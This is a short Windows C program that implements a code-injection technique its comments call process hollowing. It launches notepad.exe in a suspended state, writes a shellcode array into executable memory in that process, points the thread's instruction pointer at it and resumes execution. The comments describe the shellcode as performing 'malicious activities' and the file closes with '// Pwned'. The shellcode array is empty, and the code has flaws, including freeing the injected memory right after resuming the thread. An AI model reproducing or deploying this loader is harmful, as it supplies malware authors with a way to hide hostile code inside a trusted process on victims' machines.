#include <Windows.h>
#include <tchar.h>

unsigned char shellcode[] = {
    /* This shellcode will be executed in the hollowed process and will perform the malicious activities */
};

int _tmain(int argc, _TCHAR* argv[])
{
    /* The main function will perform the process hollowing */
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    TCHAR szCommandLine[] = _T("C:\\Windows\\System32\\notepad.exe"); // The process that will be hollowed out
    LPVOID pImageBase, pEntryPoint;
    SIZE_T dwImageSize, dwBytesWritten;
    DWORD dwThreadId;
    CONTEXT ctx;
    BOOL bSuccess;
    // We start by creating a new process to be hollowed out
    bSuccess = CreateProcess(NULL, szCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); // The process is suspended so we can change it context

    if (bSuccess)
    {
        // We calculate the size of the shellcode
        dwImageSize = sizeof(shellcode);
        // Now that we know the size of the shellcode, we can allocate memory in our process.
        pImageBase = VirtualAllocEx(pi.hProcess, NULL, dwImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        // We write the shellcode to the hollowed process memory.
        bSuccess = WriteProcessMemory(pi.hProcess, pImageBase, shellcode, dwImageSize, &dwBytesWritten);
        if (bSuccess && dwBytesWritten == dwImageSize) // If the shellcode has been written and the size of it is equal to the allocated memory
        {
            // We get the address of the shellcode in the hollowed process
            pEntryPoint = (LPVOID)((DWORD)pImageBase);
            // We also get the context of the suspended process
            ctx.ContextFlags = CONTEXT_FULL;
            GetThreadContext(pi.hThread, &ctx);
            // We can know update the context to execute the shellcode
            ctx.Eax = (DWORD)pEntryPoint;
            ctx.Eip = (DWORD)pEntryPoint;
            // Finally we update the thread context in the hollowed process
            bSuccess = SetThreadContext(pi.hThread, &ctx);
            if (bSuccess)
            {
                // Resume the suspended process to execute the shellcode
                ResumeThread(pi.hThread);
            }
        }
        // We clean up the memory of course
        VirtualFreeEx(pi.hProcess, pImageBase, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    return 0;
    // Pwned
}
